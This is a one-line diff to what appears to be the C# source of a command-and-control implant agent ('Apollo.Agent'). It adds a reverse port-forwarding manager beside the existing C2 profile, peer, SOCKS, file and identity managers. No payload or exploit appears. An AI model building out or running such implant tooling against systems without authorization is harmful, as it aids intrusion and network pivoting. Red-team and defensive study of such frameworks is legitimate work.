@@ -20,6 +20,7 @@ namespace Apollo.Agent
             C2ProfileManager = new AM.C2.C2ProfileManager(this);
             PeerManager = new AM.Peer.PeerManager(this);
             SocksManager = new AM.Socks.SocksManager(this);
+            RpfwdManager = new AM.Rpfwd.RpfwdManager(this);
             TaskManager = new AM.Tasks.TaskManager(this);
             FileManager = new AM.Files.FileManager(this);
             IdentityManager = new AM.Identity.IdentityManager(this);
